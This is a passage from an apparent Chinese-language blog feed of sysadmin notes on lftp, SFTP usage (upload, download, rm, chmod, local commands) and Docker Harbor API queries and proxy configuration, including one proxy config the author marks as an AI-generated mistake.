ls<br>drwxr-xr-x   <span class="hljs-number"> 2 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 06 </span><span class="hljs-number"> 2019 </span>pub<br>drwxr-xrwx   <span class="hljs-number"> 4 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 11 </span><span class="hljs-number"> 2020 </span>report<br>drwxr-xr-x   <span class="hljs-number"> 2 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 24 </span><span class="hljs-number"> 2021 </span>test<br>drwxr-xr-x   <span class="hljs-number"> 3 </span>0       <span class="hljs-number"> 0 </span>         <span class="hljs-number"> 12288 </span>Mar<span class="hljs-number"> 12 </span><span class="hljs-number"> 2023 </span>tmp<br>drwxr-xrwx  <span class="hljs-number"> 27 </span>0       <span class="hljs-number"> 0 </span>         <span class="hljs-number"> 12288 </span>Jul<span class="hljs-number"> 15 </span>07:56 upload<br>lftp 1.1.1.1:/&gt; dir<br>drwxr-xr-x   <span class="hljs-number"> 2 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 06 </span><span class="hljs-number"> 2019 </span>pub<br>drwxr-xrwx   <span class="hljs-number"> 4 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 11 </span><span class="hljs-number"> 2020 </span>report<br>drwxr-xr-x   <span class="hljs-number"> 2 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 24 </span><span class="hljs-number"> 2021 </span>test<br>drwxr-xr-x   <span class="hljs-number"> 3 </span>0       <span class="hljs-number"> 0 </span>         <span class="hljs-number"> 12288 </span>Mar<span class="hljs-number"> 12 </span><span class="hljs-number"> 2023 </span>tmp<br>drwxr-xrwx  <span class="hljs-number"> 27 </span>0       <span class="hljs-number"> 0 </span>         <span class="hljs-number"> 12288 </span>Jul<span class="hljs-number"> 15 </span>07:56 upload<br></code></pre></td></tr></table></figure><h2 id="cd-dirname"><a href="#cd-dirname" class="headerlink" title="cd dirname"></a><strong>cd dirname</strong></h2><p>切换目录</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">lftp <span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span><span class="hljs-symbol">:/&gt;</span> cd pub lftp <span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span><span class="hljs-symbol">:/pub&gt;</span><br></code></pre></td></tr></table></figure><h2 id="put-local-file-remote-fil"><a href="#put-local-file-remote-fil" class="headerlink" title="put local-file remote-fil"></a>put local-file remote-fil</h2><h2 id="quit-bye"><a href="#quit-bye" class="headerlink" title="quit&#x2F;bye"></a><strong>quit&#x2F;bye</strong></h2><p>退出会话</p><p>lftp 1.1.1.1:&#x2F;pub&gt; quit (base) [root@nvm &#x2F;]# lftp <a href="ftp://1.1.1.1/">ftp://1.1.1.1</a> lftp 1.1.1.1:~&gt; bye (base) [root@nvm &#x2F;]#</p><h2 id="put-mput"><a href="#put-mput" class="headerlink" title="put&#x2F;mput"></a><strong>put&#x2F;mput</strong></h2><p>上传文件</p><h1 id="风险"><a href="#风险" class="headerlink" title="风险"></a><strong>风险</strong></h1><h2 id="匿名访问风险"><a href="#匿名访问风险" class="headerlink" title="匿名访问风险"></a><strong>匿名访问风险</strong></h2><p>用户名 <strong>anonymous</strong>，密码为<strong>邮件地址</strong>或者<strong>空</strong></p><p><strong>默认安装的</strong></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>base</tag>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>ftp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sftp_base</title>
    <link href="/2024/03/04/yunwei/applications/ftp/sftp_base/"/>
    <url>/2024/03/04/yunwei/applications/ftp/sftp_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="SSH文件传输协议-安全文件传输协议"><a href="#SSH文件传输协议-安全文件传输协议" class="headerlink" title="SSH文件传输协议&#x2F;安全文件传输协议"></a>SSH文件传输协议&#x2F;安全文件传输协议</h1><p>SSH File Transfer Protocol</p><p>Secret File Transfer Protocol</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>使用ssh协议进行文件传输</p><h2 id="默认端口"><a href="#默认端口" class="headerlink" title="默认端口"></a>默认端口</h2><p>22</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>sftp是基于ssh协议，安装OpenSSH软件即可</p><h4 id="Ubuntu、Debian服务器"><a href="#Ubuntu、Debian服务器" class="headerlink" title="Ubuntu、Debian服务器"></a>Ubuntu、Debian服务器</h4><h5 id="dpkg-l-grep-ssh"><a href="#dpkg-l-grep-ssh" class="headerlink" title="dpkg -l | grep ssh"></a>dpkg -l | grep ssh</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">(base) root@VM<span class="hljs-number">-8</span><span class="hljs-number">-5</span>-ubuntu:~# dpkg -l | grep ssh<br>ii  libssh<span class="hljs-number">-4</span>:amd64                       <span class="hljs-number">0.9</span><span class="hljs-number">.3</span><span class="hljs-number">-2</span>ubuntu2<span class="hljs-number">.1</span>                  amd64        tiny C SSH library (OpenSSL flavor)<br>ii  openssh-client                       <span class="hljs-number">1</span>:<span class="hljs-number">8.2</span>p1<span class="hljs-number">-4</span>ubuntu0<span class="hljs-number">.2</span>                amd64        secure shell (SSH) client, <span class="hljs-keyword">for</span> secure <span class="hljs-keyword">access</span> <span class="hljs-keyword">to</span> remote machines<br>ii  openssh-<span class="hljs-keyword">server</span>                       <span class="hljs-number">1</span>:<span class="hljs-number">8.2</span>p1<span class="hljs-number">-4</span>ubuntu0<span class="hljs-number">.2</span>                amd64        secure shell (SSH) <span class="hljs-keyword">server</span>, <span class="hljs-keyword">for</span> secure <span class="hljs-keyword">access</span> <span class="hljs-keyword">from</span> remote machines<br>ii  openssh-sftp-<span class="hljs-keyword">server</span>                  <span class="hljs-number">1</span>:<span class="hljs-number">8.2</span>p1<span class="hljs-number">-4</span>ubuntu0<span class="hljs-number">.2</span>                amd64        secure shell (SSH) sftp <span class="hljs-keyword">server</span> module, <span class="hljs-keyword">for</span> SFTP <span class="hljs-keyword">access</span> <span class="hljs-keyword">from</span> remote machines<br>ii  ssh-<span class="hljs-keyword">import</span>-id                        <span class="hljs-number">5.10</span><span class="hljs-number">-0</span>ubuntu1                     <span class="hljs-keyword">all</span>          securely retrieve an SSH <span class="hljs-built_in">public</span> key <span class="hljs-keyword">and</span> install it locally<br></code></pre></td></tr></table></figure><p>ii 表示已安装的软件包</p><h4 id="redhat、Centos等服务器"><a href="#redhat、Centos等服务器" class="headerlink" title="redhat、Centos等服务器"></a>redhat、Centos等服务器</h4><h5 id="rpm-qa-grep-ssh"><a href="#rpm-qa-grep-ssh" class="headerlink" title="rpm -qa | grep ssh"></a>rpm -qa | grep ssh</h5><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit">(base) [root@110 ~]# rpm -qa | grep ssh<br>libssh2<span class="hljs-string">-1</span>.8.0<span class="hljs-string">-4</span>.el7.x86_64<br>openssh-server<span class="hljs-string">-7</span>.4p1<span class="hljs-string">-21</span>.el7.x86_64<br>openssh<span class="hljs-string">-7</span>.4p1<span class="hljs-string">-21</span>.el7.x86_64<br>openssh-clients<span class="hljs-string">-7</span>.4p1<span class="hljs-string">-21</span>.el7.x86_64<br></code></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><h4 id="sftp-user-host-dir"><a href="#sftp-user-host-dir" class="headerlink" title="sftp [user@]host[:dir[&#x2F;]]"></a>sftp [user@]host[:dir[&#x2F;]]</h4><h4 id="sftp-user-host-dir-p-port"><a href="#sftp-user-host-dir-p-port" class="headerlink" title="sftp [user@]host[:dir[&#x2F;]] -p port"></a>sftp [user@]host[:dir[&#x2F;]] -p port</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\WINDOWS\system32&gt;sftp ubuntu@<span class="hljs-number">114</span>.xxx.xxx.<span class="hljs-number">141</span><br><span class="hljs-attribute">ubuntu</span>@<span class="hljs-number">114</span>.xxx.xxx.<span class="hljs-number">141</span>&#x27;s password:<br><span class="hljs-attribute">Connected</span> to <span class="hljs-number">114</span>.xxx.xxx.<span class="hljs-number">141</span>.<br><span class="hljs-attribute">sftp</span>&gt; ls<br><span class="hljs-attribute">sftp</span>&gt; pwd<br><span class="hljs-attribute">Remote</span> working directory: /home/ubuntu<br><span class="hljs-attribute">sftp</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h3><p>基于登录情况下，也就是sftp终端界面</p><h4 id="上传本地文件到远程目录"><a href="#上传本地文件到远程目录" class="headerlink" title="上传本地文件到远程目录"></a>上传本地文件到远程目录</h4><p>put localfile [remotedir]</p><p>如果不指定目录，上传到当前所在目录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sftp</span>&gt; put sftpput.txt<br><span class="hljs-attribute">Uploading</span> sftpput.txt to /home/ubuntu/sftpput.txt<br><span class="hljs-attribute">sftpput</span>.txt                                                                                                    <span class="hljs-number">100</span>%   <span class="hljs-number">12</span>     <span class="hljs-number">0</span>.<span class="hljs-number">3</span>KB/s   <span class="hljs-number">00</span>:<span class="hljs-number">00</span><br><span class="hljs-attribute">sftp</span>&gt; ls<br><span class="hljs-attribute">sftpput</span>.txt<br><span class="hljs-attribute">sftp</span>&gt; pwd<br><span class="hljs-attribute">Remote</span> working directory: /home/ubuntu<br></code></pre></td></tr></table></figure><p>如果指定目录，可能会存在当前登录账号权限不足的问题</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">sftp&gt; <span class="hljs-keyword">put</span> sftpput.txt /<span class="hljs-keyword">opt</span>/test/<br>Uploading sftpput.txt <span class="hljs-keyword">to</span> /<span class="hljs-keyword">opt</span>/test/sftpput.txt<br>remote <span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;/opt/test/sftpput.txt&quot;</span>): Permission denied<br></code></pre></td></tr></table></figure><h4 id="上传本地目录文件到远程目录"><a href="#上传本地目录文件到远程目录" class="headerlink" title="上传本地目录文件到远程目录"></a>上传本地目录文件到远程目录</h4><p>put -r localDir remoteDir</p><h4 id="上传多个文件到远程目录"><a href="#上传多个文件到远程目录" class="headerlink" title="上传多个文件到远程目录"></a>上传多个文件到远程目录</h4><p>文件名支持通配符*</p><p>mput localfile remoteDir</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">sftp&gt; mput .<span class="hljs-regexp">/test/</span>dirput<span class="hljs-regexp">/*.txt ./</span><br>Uploading .<span class="hljs-regexp">/test/</span>dirput<span class="hljs-regexp">/1.txt to /</span>home<span class="hljs-regexp">/ubuntu/</span>./<span class="hljs-number">1</span>.txt<br>.<span class="hljs-regexp">/test/</span>dirput<span class="hljs-regexp">/1.txt                                                 100%    6     0.2KB/</span>s   <span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>Uploading .<span class="hljs-regexp">/test/</span>dirput<span class="hljs-regexp">/2.txt to /</span>home<span class="hljs-regexp">/ubuntu/</span>./<span class="hljs-number">2</span>.txt<br>.<span class="hljs-regexp">/test/</span>dirput/<span class="hljs-number">2</span>.txt<br></code></pre></td></tr></table></figure><h4 id="上传多个目录的文件到远程目录"><a href="#上传多个目录的文件到远程目录" class="headerlink" title="上传多个目录的文件到远程目录"></a>上传多个目录的文件到远程目录</h4><p>目录名支持通配符*</p><p>mput -r locatDirs remoteDir</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">sftp&gt; mput -r .<span class="hljs-regexp">/test/</span>dir* <span class="hljs-regexp">/home/u</span>buntu<br>Uploading .<span class="hljs-regexp">/test/</span>dirmput<span class="hljs-regexp">/ to /</span>home<span class="hljs-regexp">/ubuntu/</span><br>Entering .<span class="hljs-regexp">/test/</span>dirmput/<br>.<span class="hljs-regexp">/test/</span>dirmput<span class="hljs-regexp">/mput1.txt                                            100%    0     0.0KB/</span>s   <span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>.<span class="hljs-regexp">/test/</span>dirmput<span class="hljs-regexp">/mput2.txt                                            100%    0     0.0KB/</span>s   <span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>Uploading .<span class="hljs-regexp">/test/</span>dirput<span class="hljs-regexp">/ to /</span>home<span class="hljs-regexp">/ubuntu/</span><br>Entering .<span class="hljs-regexp">/test/</span>dirput/<br>.<span class="hljs-regexp">/test/</span>dirput<span class="hljs-regexp">/1.txt                                                 100%    6     0.2KB/</span>s   <span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>.<span class="hljs-regexp">/test/</span>dirput<span class="hljs-regexp">/2.txt                                                 100%    6     0.2KB/</span>s   <span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>sftp&gt; ls<br><span class="hljs-number">1</span>.txt         <span class="hljs-number">2</span>.txt         mput1.txt     mput2.txt     sftpput.txt<br></code></pre></td></tr></table></figure><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><h4 id="下载远程文件到本地目录"><a href="#下载远程文件到本地目录" class="headerlink" title="下载远程文件到本地目录"></a>下载远程文件到本地目录</h4><p>get remoteFile [localDir]</p><h4 id="下载远程目录文件到本地目录"><a href="#下载远程目录文件到本地目录" class="headerlink" title="下载远程目录文件到本地目录"></a>下载远程目录文件到本地目录</h4><p>get -r remoteDirFiles [localDir]</p><h4 id="下载多个远程文件到本地目录"><a href="#下载多个远程文件到本地目录" class="headerlink" title="下载多个远程文件到本地目录"></a>下载多个远程文件到本地目录</h4><p>文件名支持通配符*</p><p>mget remoteFiles [localDir]</p><h4 id="下载多个远程目录的文件到本地目录"><a href="#下载多个远程目录的文件到本地目录" class="headerlink" title="下载多个远程目录的文件到本地目录"></a>下载多个远程目录的文件到本地目录</h4><p>目录名支持通配符*</p><p>mget remoteDirsFile [localDir]</p><h3 id="执行远程命令"><a href="#执行远程命令" class="headerlink" title="执行远程命令"></a>执行远程命令</h3><h4 id="删除-rm"><a href="#删除-rm" class="headerlink" title="删除 rm"></a>删除 rm</h4><p>没有 -r -f  这种参数，每次也只能删除一个文件，多个文件名只删除第一个</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sftp</span>&gt; rm -rf <span class="hljs-number">1</span>.txt <span class="hljs-number">2</span>.txt<br><span class="hljs-attribute">rm</span>: Invalid flag -r<br><span class="hljs-attribute">sftp</span>&gt; rm -f <span class="hljs-number">1</span>.txt <span class="hljs-number">2</span>.txt<br><span class="hljs-attribute">rm</span>: Invalid flag -f<br><span class="hljs-attribute">sftp</span>&gt; rm <span class="hljs-number">1</span>.txt <span class="hljs-number">2</span>.txt<br><span class="hljs-attribute">Removing</span> /home/ubuntu/<span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><h4 id="列表-ls"><a href="#列表-ls" class="headerlink" title="列表 ls"></a>列表 ls</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">sftp&gt; </span><span class="language-bash"><span class="hljs-built_in">ls</span></span><br>2.txt         sftpput.txt<br></code></pre></td></tr></table></figure><h4 id="权限修改-chmod"><a href="#权限修改-chmod" class="headerlink" title="权限修改 chmod"></a>权限修改 chmod</h4><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tap">sftp&gt; ls -l<br>-rw-rw-r--   <span class="hljs-number"> 1 </span>ubuntu   ubuntu         <span class="hljs-number"> 6 </span>May<span class="hljs-number"> 20 </span>23:44 2.txt<br>-rw-rw-r--   <span class="hljs-number"> 1 </span>ubuntu   ubuntu        <span class="hljs-number"> 12 </span>May<span class="hljs-number"> 20 </span>23:38 sftpput.txt<br>sftp&gt; chmod<span class="hljs-number"> 777 </span>2.txt<br>Changing mode on /home/ubuntu/2.txt<br>sftp&gt; ls -l<br>-rwxrwxrwx   <span class="hljs-number"> 1 </span>ubuntu   ubuntu         <span class="hljs-number"> 6 </span>May<span class="hljs-number"> 20 </span>23:44 2.txt<br>-rw-rw-r--   <span class="hljs-number"> 1 </span>ubuntu   ubuntu        <span class="hljs-number"> 12 </span>May<span class="hljs-number"> 20 </span>23:38 sftpput.txt<br></code></pre></td></tr></table></figure><h3 id="执行本地命令"><a href="#执行本地命令" class="headerlink" title="执行本地命令"></a>执行本地命令</h3><h4 id="sftp命令-常规命令前加-l"><a href="#sftp命令-常规命令前加-l" class="headerlink" title="sftp命令-常规命令前加 l"></a>sftp命令-常规命令前加 l</h4><h5 id="lls"><a href="#lls" class="headerlink" title="lls"></a>lls</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sftp</span>&gt; lls<br> <span class="hljs-attribute">Volume</span> in drive D is 安全<br> <span class="hljs-attribute">Volume</span> Serial Number is <span class="hljs-number">5</span>AED-<span class="hljs-number">1001</span><br><br> <span class="hljs-attribute">Directory</span> of D:\other<br><br><span class="hljs-attribute">2022</span>/<span class="hljs-number">05</span>/<span class="hljs-number">20</span>  <span class="hljs-number">23</span>:<span class="hljs-number">35</span>    &lt;DIR&gt;          .<br><span class="hljs-attribute">2022</span>/<span class="hljs-number">05</span>/<span class="hljs-number">20</span>  <span class="hljs-number">23</span>:<span class="hljs-number">35</span>    &lt;DIR&gt;          ..<br><span class="hljs-attribute">2020</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>  <span class="hljs-number">20</span>:<span class="hljs-number">21</span>    &lt;DIR&gt;          othertools<br><span class="hljs-attribute">2022</span>/<span class="hljs-number">05</span>/<span class="hljs-number">20</span>  <span class="hljs-number">23</span>:<span class="hljs-number">43</span>    &lt;DIR&gt;          test<br>               <span class="hljs-attribute">0</span> File(s)              <span class="hljs-number">0</span> bytes<br>               <span class="hljs-attribute">4</span> Dir(s)  <span class="hljs-number">20</span>,<span class="hljs-number">883</span>,<span class="hljs-number">435</span>,<span class="hljs-number">520</span> bytes free<br></code></pre></td></tr></table></figure><h5 id="lpwd"><a href="#lpwd" class="headerlink" title="lpwd"></a>lpwd</h5><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">sftp&gt; lpwd<br><span class="hljs-keyword">Local</span> working directory: d:\other<br></code></pre></td></tr></table></figure><h4 id="本地命令-本地存在命令前加"><a href="#本地命令-本地存在命令前加" class="headerlink" title="本地命令-本地存在命令前加 !"></a>本地命令-本地存在命令前加 !</h4><p>!dir</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sftp</span>&gt; !dir<br> <span class="hljs-attribute">Volume</span> in drive D is 安全<br> <span class="hljs-attribute">Volume</span> Serial Number is <span class="hljs-number">5</span>AED-<span class="hljs-number">1001</span><br><br> <span class="hljs-attribute">Directory</span> of D:\other<br><br><span class="hljs-attribute">2022</span>/<span class="hljs-number">05</span>/<span class="hljs-number">20</span>  <span class="hljs-number">23</span>:<span class="hljs-number">35</span>    &lt;DIR&gt;          .<br><span class="hljs-attribute">2022</span>/<span class="hljs-number">05</span>/<span class="hljs-number">20</span>  <span class="hljs-number">23</span>:<span class="hljs-number">35</span>    &lt;DIR&gt;          ..<br><span class="hljs-attribute">2020</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>  <span class="hljs-number">20</span>:<span class="hljs-number">21</span>    &lt;DIR&gt;          othertools<br><span class="hljs-attribute">2022</span>/<span class="hljs-number">05</span>/<span class="hljs-number">20</span>  <span class="hljs-number">23</span>:<span class="hljs-number">43</span>    &lt;DIR&gt;          test<br>               <span class="hljs-attribute">0</span> File(s)              <span class="hljs-number">0</span> bytes<br>               <span class="hljs-attribute">4</span> Dir(s)  <span class="hljs-number">20</span>,<span class="hljs-number">883</span>,<span class="hljs-number">435</span>,<span class="hljs-number">520</span> bytes free<br></code></pre></td></tr></table></figure><h5 id="ipconfig"><a href="#ipconfig" class="headerlink" title="!ipconfig"></a>!ipconfig</h5><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">sftp&gt; !ipconfig</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Windows IP Configuration</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Ethernet adapter 以太网</span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation"></span><br>   <span class="hljs-attribute">Media State . . . . . . . . . . .</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">Media disconnected</span><br>   <span class="hljs-attribute">Connection-specific DNS Suffix  . </span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation"></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>base</tag>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>ftp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iotop</title>
    <link href="/2024/03/04/yunwei/yunweicommands/Linuxcommands/iotop/"/>
    <url>/2024/03/04/yunwei/yunweicommands/Linuxcommands/iotop/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_tips</title>
    <link href="/2024/02/28/yunwei/applications/docker/docker_tips/"/>
    <url>/2024/02/28/yunwei/applications/docker/docker_tips/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>命令基于 mac Docker Desktop 4.11.1 (84025) </p><h3 id="查询指定镜像仓库镜像列表"><a href="#查询指定镜像仓库镜像列表" class="headerlink" title="查询指定镜像仓库镜像列表"></a>查询指定镜像仓库镜像列表</h3><p><strong>Curl</strong></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">curl -X <span class="hljs-symbol">&#x27;GET</span><span class="hljs-string">&#x27; &#x27;</span>h__ps://demo.goharbor.io/api/v2.<span class="hljs-number">0</span>/projects?page=<span class="hljs-number">1</span>&amp;page_size=<span class="hljs-number">10</span>&amp;with_detail=<span class="hljs-literal">true</span>&#x27;  -H <span class="hljs-symbol">&#x27;accept</span>: application/json&#x27;<br></code></pre></td></tr></table></figure><p><strong>Request URL</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://demo.goharbor.io/api/v2.<span class="hljs-number">0</span>/projects?page=<span class="hljs-number">1</span>&amp;page_size=<span class="hljs-number">10</span>&amp;with_detail=true<br></code></pre></td></tr></table></figure><p>q&#x3D;string   </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">格式<span class="hljs-attribute">q</span>=k=v <br><span class="hljs-attribute">q</span>=name=admin 精确匹配<br><span class="hljs-attribute">q</span>=name=~admin 模糊匹配<br></code></pre></td></tr></table></figure><p>q&#x3D;name&#x3D;admin</p><p>page&#x3D;interger</p><p>page_size&#x3D;interger</p><p>name&#x3D;string 指定项目</p><p>sort&#x3D;string  指定排序字段</p><p>public&#x3D;boolean  指定查询公开项目还是私有项目，默认公开项目</p><p>owner&#x3D;string  指定作者</p><p>with_detail&#x3D;boolean  指定是否需要展示详情</p><h3 id="查询指定镜像仓库指定镜像"><a href="#查询指定镜像仓库指定镜像" class="headerlink" title="查询指定镜像仓库指定镜像"></a>查询指定镜像仓库指定镜像</h3><p><strong>CURL</strong></p><p>curl -X ‘GET’ ‘h__ps:&#x2F;&#x2F;demo.goharbor.io&#x2F;api&#x2F;v2.0&#x2F;search?q&#x3D;1’ -H ‘accept: application&#x2F;json’</p><p><strong>Request URL</strong></p><p>h__ps:&#x2F;&#x2F;demo.goharbor.io&#x2F;api&#x2F;v2.0&#x2F;search?q&#x3D;1</p><h3 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h3><p>修改 &#x2F;etc&#x2F;docker&#x2F;daemon.json</p><p>增加以下配置</p><p>正确配置</p><p><a href="https://docs.docker.com/engine/daemon/proxy/">https://docs.docker.com/engine/daemon/proxy/</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;proxies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;http-proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://proxy.example.com:3128&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;https-proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://proxy.example.com:3129&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;no-proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*.test.example.com,.example.org,127.0.0.0/8&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>错误配置（来自豆包），使用错误配置后，重启docker进程会报错</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;proxies&quot;</span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation">&#123;</span><br>   <span class="hljs-attr">&quot;default&quot;</span><span class="hljs-punctuation">:</span><br>   <span class="hljs-punctuation">&#123;</span><br>       <span class="hljs-attr">&quot;httpProxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://10.222.28.6:7890&quot;</span><span class="hljs-punctuation">,</span><br>       <span class="hljs-attr">&quot;httpsProxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://10.222.28.6:7890&quot;</span><span class="hljs-punctuation">,</span><br>       <span class="hljs-attr">&quot;noProxy&quot;</span><span class="hljs-punctuation">:</span> <span 